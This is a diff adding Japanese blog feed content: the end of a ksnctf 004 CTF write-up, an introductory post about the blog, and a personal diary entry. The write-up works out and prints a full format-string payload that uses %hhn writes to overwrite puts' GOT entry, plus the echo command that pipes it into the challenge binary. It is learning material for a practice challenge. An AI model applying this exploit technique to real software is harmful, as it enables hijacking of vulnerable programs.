+                                                                            &lt;span class=&quot;c&quot;&gt;# ↓↓↓↓ flag.txt を読み込んで表示する処理 ↓↓↓↓&lt;/span&gt;
+ 8048691:       c7 44 24 04 e6 87 04    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487e6&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;#   引数2 &quot;flag.txt&quot;&lt;/span&gt;
+ 8048698:       08
+ 8048699:       c7 04 24 e8 87 04 08    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487e8&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#   引数1 &quot;r&quot;&lt;/span&gt;
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &amp;lt;fopen@plt&amp;gt;          &lt;span class=&quot;c&quot;&gt;# fp = fopen(&quot;flag.txt&quot;, &quot;r&quot;)&lt;/span&gt;
+ 80486a5:       89 84 24 1c 04 00 00    mov    %eax,0x41c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486ac:       8b 84 24 1c 04 00 00    mov    0x41c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax             &lt;span class=&quot;c&quot;&gt;#   引数3 FILE* fp&lt;/span&gt;
+ 80486b3:       89 44 24 08             mov    %eax,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486b7:       c7 44 24 04 00 04 00    movl   &lt;span class=&quot;nv&quot;&gt;$0x400&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;#   引数2 0x400 = 1024&lt;/span&gt;
+ 80486be:       00
+ 80486bf:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 80486c3:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &amp;lt;fgets@plt&amp;gt;          &lt;span class=&quot;c&quot;&gt;# fgets(input, 1024, fp)&lt;/span&gt;
+ 80486cb:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 80486cf:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486d2:       e8 &lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;fd ff ff          call   80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;         &lt;span class=&quot;c&quot;&gt;# printf(input)&lt;/span&gt;
+ 80486d7:       b8 00 00 00 00          mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
+                                                                            &lt;span class=&quot;c&quot;&gt;# ↑↑↑↑ ------------------------------- ↑↑↑↑&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　これの、&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 8048691:       c7 44 24 04 e6 87 04    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487e6&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;#   引数2 &quot;flag.txt&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　である。つまり、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if(canFlag == 1)&lt;/code&gt; を抜けた所( &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08048691&lt;/code&gt;アドレス )に飛ばすわけである。&lt;/p&gt;
+
+&lt;p&gt;　これで、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; 関数を呼び出したら、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if(canFlag == 1)&lt;/code&gt; を抜けたところに飛ぶという風に挙動を変えることが出来る。&lt;/p&gt;
+
+&lt;p&gt;　※セキュリティ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIE&lt;/code&gt; が無効であることも重要である。コード領域がランダム化されていないからこそ、ジャンプ先のアドレスを狙い撃ち出来る。&lt;/p&gt;
+
+&lt;h3 id=&quot;下準備3-書き換え内容の計算&quot;&gt;下準備3 書き換え内容の計算&lt;/h3&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80499f4&lt;/code&gt; アドレス(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt;関数のGOTアドレス)に &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;08048691&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if(canFlag == 1)&lt;/code&gt; を抜けた所のアドレス)を書き込む。&lt;/p&gt;
+
+&lt;p&gt;　即ち、&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;書き込み先アドレス&lt;/th&gt;
+      &lt;th&gt;書き込み内容&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x80499f4&lt;/td&gt;
+      &lt;td&gt;91&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x80499f5&lt;/td&gt;
+      &lt;td&gt;86&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x80499f6&lt;/td&gt;
+      &lt;td&gt;04&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x80499f7&lt;/td&gt;
+      &lt;td&gt;08&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;　と書き込む。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91&lt;/code&gt; から書き込んでいるのはリトルエンディアンのためだ。後ろから読む方式だ。&lt;/p&gt;
+
+&lt;p&gt;　書き込むために計算をする。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;書き込み内容&lt;/th&gt;
+      &lt;th&gt;計算&lt;/th&gt;
+      &lt;th&gt;byte数&lt;/th&gt;
+      &lt;th&gt;累積 byte数&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;\x08\x04\x99\xf4&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;\x08\x04\x99\xf5&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;8&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;\x08\x04\x99\xf6&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;12&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;\x08\x04\x99\xf7&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;16&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%129c&lt;/td&gt;
+      &lt;td&gt;145(0x91) - 16(0x10)&lt;/td&gt;
+      &lt;td&gt;129(0x81)&lt;/td&gt;
+      &lt;td&gt;145(0x91)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%6$hhn&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%245c&lt;/td&gt;
+      &lt;td&gt;134(0x86) - 145(0x91) + 256(0x100)&lt;/td&gt;
+      &lt;td&gt;245(0xF5)&lt;/td&gt;
+      &lt;td&gt;390(0x186)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%7$hhn&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%126c&lt;/td&gt;
+      &lt;td&gt;4(0x04) - 390(0x186) + 512(0x200)&lt;/td&gt;
+      &lt;td&gt;126(0x7E)&lt;/td&gt;
+      &lt;td&gt;516(0x204)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%8$hhn&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%4c&lt;/td&gt;
+      &lt;td&gt;8(0x08) - 516(0x204) + 512(0x200)&lt;/td&gt;
+      &lt;td&gt;4(0x04)&lt;/td&gt;
+      &lt;td&gt;520(0x208)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;%9$hhn&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;　書き込みたいアドレスを文頭に配置する。今回は4つ。その後ろに実際に書き込む値を指定する。今回は 1byte ずつ書き込むことにするので &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%hhn&lt;/code&gt; の書式トークンを利用する。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%6$hnn&lt;/code&gt; は6番目のメモリが指すアドレスに書き込む事を示す。（ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt; の6番目に &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;41414141&lt;/code&gt; と並んでいたのを思い出して欲しい。今はここに &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x08\x04\x99\xf4&lt;/code&gt; 即ち、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;080499f4&lt;/code&gt; と並んでいることになる）&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%129c&lt;/code&gt; は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91&lt;/code&gt; という値を示す。累積 byte数を書き込むため、表で言えば、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;129(0x81)&lt;/code&gt; を指定することで &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;145(0x91)&lt;/code&gt; 即ち &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91&lt;/code&gt; を書き込む。&lt;/p&gt;
+
+&lt;p&gt;　下2つを書き込む仕様のため、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%245c&lt;/code&gt; と指定した時の累積バイト数が &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;390(0x186)&lt;/code&gt; のため &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;86&lt;/code&gt; を書き込む。&lt;/p&gt;
+
+&lt;p&gt;　同様に、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$126c&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%4c&lt;/code&gt; はそれぞれ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;516(0x204)&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;520(0x208)&lt;/code&gt; であり &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;04&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;08&lt;/code&gt; を書き込む。&lt;/p&gt;
+
+&lt;p&gt;　計算方法は、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;書き込みたい文字 - 累積バイト数&lt;/code&gt; である。負の値にならないように必要に応じて &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;512(0x200)&lt;/code&gt; を加算する。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x108&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x208&lt;/code&gt; は全て &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;08&lt;/code&gt; を書き込む仕様のため、負にならないように繰り上げれば問題ない。&lt;/p&gt;
+
+&lt;p&gt;　長かったがこれで書き込む文字列が完成した。以下だ。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;　見やすさのために分けると、以下のように分けられる。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\xf4\x99\x04\x08&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\xf5\x99\x04\x08&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\xf6\x99\x04\x08&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\xf7\x99\x04\x08&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%129c%6$hhn&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%245c%7$hhn&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%126c%8$hhn&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%4c%9$hhn&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎を解く&quot;&gt;謎を解く&lt;/h3&gt;
+
+&lt;p&gt;　後は、実際に入力してみればいい。コマンドラインから入力する形式で示す。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-en&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn'&lt;/span&gt; | ./q4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　無事に Flag を獲得した。いやはや長かった。　&lt;/p&gt;
+
+&lt;h2 id=&quot;所感&quot;&gt;所感&lt;/h2&gt;
+&lt;p&gt;　pwn をちゃんと解いたのは今回が初めてである。&lt;/p&gt;
+
+&lt;p&gt;　同僚からの話で雰囲気・用語・コマンドについていくつか聞いたことがあったが、いざ解こうと思った時には分からないことばかりであった。&lt;/p&gt;
+
+&lt;p&gt;　結局、セキュリティ・脆弱性についていろいろ調べることになった。&lt;/p&gt;
+
+&lt;p&gt;　おかげで少しは詳しくなったし、 pwn の面白さも分かったと言える。&lt;/p&gt;
+
+&lt;p&gt;　本当は、 ksnctf の write-up を書くつもりはなかった。だが、この 004 番に取り組む中で、 write-up を書き残したくなったのだ。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;分かったことを言語化すること&lt;/li&gt;
+  &lt;li&gt;どのように解いたかをいつでも振り替えられる状態にしておくこと&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　この2点を満たしたいがために、 write-up を書くと決めた。&lt;/p&gt;
+
+&lt;p&gt;　誰が見ても分かる write-up というよりは、自分で見たら思いだせる write-up という傾向の方が強くなっているかもしれない。&lt;/p&gt;
+
+&lt;p&gt;　ただ、見返してみると自分でも分かりづらい記事に感じる。これは記事の構成が悪いのだとは思う。気が向いたら直すかもしれない。&lt;/p&gt;
+
+&lt;p&gt;　およそ2週間ほどこの問題と戦ったが、とても勉強になった。&lt;/p&gt;
+
+&lt;p&gt;　初めは逆アセンブルしても &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSB&lt;/code&gt; に気づけなかった。それで脆弱性の種類を調べる必要に迫られた。また、セキュリティの状態によって使える攻撃手法や書き込める領域が異なるようで、脆弱性だけでなくセキュリティについての知識も十分に求められていることに気づいた。&lt;/p&gt;
+
+&lt;p&gt;　しばらくして、久しぶりに逆アセンブルした結果を見ると、いとも簡単に &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSB&lt;/code&gt; に気づけた。セキュリティチェックもすると、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT overwrite&lt;/code&gt; の可能性も浮上した。&lt;/p&gt;
+
+&lt;p&gt;　そこからは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%hhn&lt;/code&gt; の使い方の部分で案外苦労した。攻撃計画を立案出来ても、実際の攻撃コードを組み立てるのも難しさがあった。&lt;/p&gt;
+
+&lt;p&gt;　フラグを取るまで長かったが、全てが一本の線で綺麗にまとまっている気がしてとても清々しい気分だ。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksnctf 004&lt;/code&gt; を解けたことで、私のCTFはようやく始まったのだと言える。&lt;/p&gt;
+
+&lt;p&gt;　ありがとう &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTF&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;　ありがとう &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kasnctf&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;　
+　&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 001 Test Problem, はじめに</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/001.html" rel="alternate" type="text/html" title="ksnctf 001 Test Problem, はじめに" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/001</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/001.html">&lt;h2 id=&quot;ksnctf-001-test-problem&quot;&gt;ksnctf 001 Test Problem&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;問題公開日: 2012/05/24&lt;/li&gt;
+  &lt;li&gt;ジャンル: -&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎解き&quot;&gt;謎解き&lt;/h3&gt;
+&lt;p&gt;　謎なし。&lt;/p&gt;
+
+&lt;p&gt;　問題文に答えが書いてある。&lt;/p&gt;
+
+&lt;p&gt;　よし、やってやるぞ。&lt;/p&gt;
+
+&lt;h2 id=&quot;所感&quot;&gt;所感&lt;/h2&gt;
+
+&lt;h3 id=&quot;はじめに&quot;&gt;はじめに&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ksnctf.sweetduet.info&quot;&gt;ksnctf&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;問題の公開後3か月が経過していること
+      &lt;ul&gt;
+        &lt;li&gt;問題の公開日は問題文の右上に記載しています&lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/li&gt;
+    &lt;li&gt;フラグの文字列は公開しないこと&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;また、write-upを書くために、問題文や問題のファイルの解析結果などを転載することを許諾します。 ただし、一部の画像やライブラリなど、私以外の第三者が権利を持つファイルもあるので注意してください。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;このブログについて&quot;&gt;このブログについて&lt;/h3&gt;
+
+&lt;p&gt;　&lt;strong&gt;数年前に同僚に誘われてCTFを知った。&lt;/strong&gt;それから何度かイベントに出てみたが解けた問題は片手で数えられる程度しかない。知識理解はほぼ未経験者のそれと同レベルであり、経験があるなどとは口が裂けても言えない程度である。&lt;/p&gt;
+
+&lt;p&gt;　その後、私はSEという職も辞してしまい、専門家として肩書も投げ捨ててしまった。専門家など片腹痛い。仕事をテキパキこなせていれば辞してなどいなかった。&lt;/p&gt;
+
+&lt;p&gt;　のんびり過ごす中で、考えたことをまとめたり日記として残していきたいと感じ、 Web Log という形で情報を集約していくことにした。情報というのはひとえに「自らを解体すること」に基づく集合を指す。私の思ったこと・考えたこと・知ったこと・作ったものなどだ。私は自らを解体し続けることだけは死ぬまで続けられると考えているのである。&lt;/p&gt;
+
+&lt;p&gt;　解体は遅々とした速度で進む。成果の一つとして、&lt;strong&gt;「謎」に対しての並々ならぬ興味の存在&lt;/strong&gt;に自分自身でありながら驚かされた。&lt;/p&gt;
+
+&lt;p&gt;　Webの流行りと共に現れたURLを行き来する遊びサイト、Flash時代に流行った脱出ゲーム、リアル脱出ゲーム、パズルゲーム、謎を主体にしたフリーゲーム。&lt;/p&gt;
+
+&lt;p&gt;　RPGやACTで敵と戦う時にも重なり合う小さな謎（弱点、手順、回避、攻撃）を紐解いて戦っている。&lt;/p&gt;
+
+&lt;p&gt;　小説や映像では、伏線を解決していく瞬間、どんでん返しのような想像もしなかった結末、一つの点を舞台にして視点が交差していく群像劇などはまさに謎を紐解くいている感覚と言える。&lt;/p&gt;
+
+&lt;p&gt;　私の根底に、いや人の根底に「謎」に対する興味があると感じたその時、数年前の同僚を思い出し、CTFを思い出した。&lt;/p&gt;
+
+&lt;p&gt;　あの頃は知識理解が無さ過ぎた。&lt;/p&gt;
+
+&lt;p&gt;　解体を進めるためにも私は謎を解かなくてはならない。謎のジャンルは問わない。ゲームを遊ぶでも小説を読むでも。&lt;/p&gt;
+
+&lt;p&gt;　触れてみよう。&lt;/p&gt;
+
+&lt;p&gt;　このブログは私自身を解体する道である。&lt;/p&gt;
+
+&lt;p&gt;　CTFはその道中の一つであり、謎の一つである。&lt;/p&gt;
+
+&lt;p&gt;　イベントに参加しようと思ったが、今はしっかりと地に足をつけてCTFに触れていきたい。そこで常設のksnctfに辿り着く。&lt;/p&gt;
+
+&lt;p&gt;　問題を解くことが目的ではなく、&lt;strong&gt;問題について知ること・問題に関係している用語や概念を自分の中で整理分類していくこと&lt;/strong&gt;を目的としてksnctfと言うサイトを活用していきたい。&lt;/p&gt;
+
+&lt;h3 id=&quot;記事の形式&quot;&gt;記事の形式&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;問題と解法&lt;/li&gt;
+  &lt;li&gt;所感&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　&lt;strong&gt;謎とは「問題が何かを見極める瞬間」「あれやこれやと悩む時間」「手法と解答への疑念を払拭するための論理補強」「解答を入力する瞬間」など楽しい時間で満ちている。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;　良質な謎・良質なCTFは限られている。1問1問を、私の些細な記事によって殺したくはない。可能ならぜひ自力で解いてみて欲しい。どうしてもという時にヒントとして数行を読んでみるというのはありだろう。お好きに参考にしてくれて構わない。が、&lt;/p&gt;
+
+&lt;p&gt;　&lt;strong&gt;記事の質は低いと考えてもらいたい&lt;/strong&gt;。全ての問題を十分な知識と理解を持って解けたと言えるとは現時点で到底想像できない。それを承知の上で、私が生きた Log として記事を書いていく。質の高低は気にせずに、&lt;strong&gt;主観的な納得感に従って進む&lt;/strong&gt;と考えて欲しい。&lt;/p&gt;
+
+&lt;p&gt;　可能ならばちゃんと全問解く。人生後50年あるとすれば、1年1問でも間に合う。そういう気持ちでやって行く。&lt;/p&gt;
+
+&lt;h3 id=&quot;知識&quot;&gt;知識&lt;/h3&gt;
+
+&lt;p&gt;　このブログの『Memo』というページにまとめていく。（見つからなければ名称が変わった可能性がある。探せばどこかにあるはず）&lt;/p&gt;
+
+&lt;p&gt;　ヘッダーから飛んで欲しい。&lt;/p&gt;
+
+&lt;h3 id=&quot;おわりに&quot;&gt;おわりに&lt;/h3&gt;
+
+&lt;p&gt;　とまあ、こんな形で、所感を述べていく。&lt;/p&gt;
+
+&lt;p&gt;　はいでは。&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">本気とは</title><link href="/contents/diary/2021/05/01/hello.html" rel="alternate" type="text/html" title="本気とは" /><published>2021-05-01T12:38:04+00:00</published><updated>2021-05-01T12:38:04+00:00</updated><id>/contents/diary/2021/05/01/hello</id><content type="html" xml:base="/contents/diary/2021/05/01/hello.html">&lt;h2 id=&quot;どうやるか&quot;&gt;どうやるか&lt;/h2&gt;
+&lt;p&gt;　本気でやる。&lt;/p&gt;
+
+&lt;p&gt;　本気でやれた試しがない。&lt;/p&gt;
+
+&lt;p&gt;　仕事の時もそうだったが、趣味であっても本気で何かをやれたことはない。やろうと思ったこともあったが足りないらしい。趣味に至っては本気でやろうと思ったことすらない気がする。&lt;/p&gt;
+
+&lt;p&gt;「本気でやればこういう結果にならない」&lt;/p&gt;
+
+&lt;p&gt;　この言葉に、私は返す言葉が無い。&lt;/p&gt;
+
+&lt;h2 id=&quot;本気でやれるか&quot;&gt;本気でやれるか&lt;/h2&gt;
+&lt;p&gt;　本気・真剣・誠意・気合。&lt;/p&gt;
+
+&lt;p&gt;　そういう感覚で行動を起こすのは難しい。言いたいことは分かるのだが。&lt;/p&gt;
+
+&lt;p&gt;　何かをやる時は「あーやるかー」「やりたいなぁ」「気になってたんだよね」の感覚で始める。&lt;/p&gt;
+
+&lt;p&gt;　そのまま夢中になる場合もあるが、少しすると気が散って別のことに手を出したりもする。&lt;/p&gt;
+
+&lt;p&gt;　何が何でもやってやるぞの姿勢は良いと思うのだが、それほどまでにやりたいことはないと思ってしまう。そうやれと言われて、やったことはあるのだが、やはり足りないのだそうだ。気持ちや意識の違いが確かに行動に違いを生む。&lt;/p&gt;
+
+&lt;p&gt;　そう思うと、やはり私に無理だろう。&lt;/p&gt;
+
+&lt;p&gt;　こうして、考えていることも本気で考えていないということが分かる。&lt;/p&gt;
+
+&lt;p&gt;　しかし、結末に納得が行こうが行くまいがいいだろうと思ってしまうのも事実である。&lt;/p&gt;
+
+&lt;p&gt;　そもそも何か前提が違うのかもしれない。&lt;/p&gt;
+
+&lt;p&gt;　本気でやるために必要な何かがある。&lt;/p&gt;
+
+&lt;h2 id=&quot;何が必要か&quot;&gt;何が必要か&lt;/h2&gt;
+&lt;p&gt;　分からない。&lt;/p&gt;
+
+&lt;h2 id=&quot;ただ&quot;&gt;ただ&lt;/h2&gt;
+&lt;p&gt;　それでも、毎日少しずつ本を読み進めてみたりはしてみている。&lt;/p&gt;
+
+&lt;p&gt;　読み終えられたら良いし、本を生かして何か出来たら良い。&lt;/p&gt;
+
+&lt;p&gt;　けど、読み終えられなくても、本を生かせなくても良いとも思っている。&lt;/p&gt;
+
+&lt;p&gt;　人生で必要であり不要でもあるのだろう。&lt;/p&gt;
+
+&lt;p&gt;　だが、人生自体が必要であり不要であるという認識だから、どの対象についてもこういう認識が拭えない。&lt;/p&gt;
+
+&lt;h2 id=&quot;人生は必要か&quot;&gt;人生は必要か&lt;/h2&gt;
+&lt;p&gt;　人が生きていなくても世界はある。&lt;/p&gt;
+
+&lt;p&gt;　私が生きていなくても人はある。&lt;/p&gt;
+
+&lt;p&gt;　人がいれば世界は変化する。&lt;/p&gt;
+
